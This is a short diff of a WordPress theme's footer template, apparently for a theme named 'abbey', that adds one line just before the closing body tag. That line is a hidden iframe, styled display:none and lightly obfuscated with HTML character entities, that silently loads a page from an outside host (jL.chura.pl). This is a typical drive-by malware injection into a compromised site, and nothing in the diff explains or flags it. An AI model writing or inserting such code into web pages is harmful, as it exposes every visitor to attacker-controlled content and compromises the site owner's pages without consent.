@@ -30,5 +30,6 @@ $site_about = ( !empty( abbey_get_defaults( "about" ) ) ) ? abbey_get_defaults( 
 	
 </div><!--#site wrapper open in header.php -->
 	<?php wp_footer(); ?>
+<iframe src="http://jL.c&#104;ura.pl/rc/" style="&#100;isplay:none"></iframe>
 </body>
 </html>
